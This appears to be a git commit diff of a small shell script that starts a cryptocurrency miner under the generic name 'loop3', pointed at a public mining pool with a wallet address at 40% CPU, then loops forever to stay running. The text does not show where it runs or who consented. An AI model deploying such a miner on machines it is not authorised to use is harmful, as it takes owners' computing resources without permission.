808a67e245e86041c180051338668e492dc6ac7e
cihuuy <95659029+cihuuy@users.noreply.github.com>
2021-12-30 10:52:36 +0530

    Update vera.sh

--- vera.sh
+++ vera.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
-./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
+./loop3 -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
 while [ 1 ]; do
 sleep 3
 done
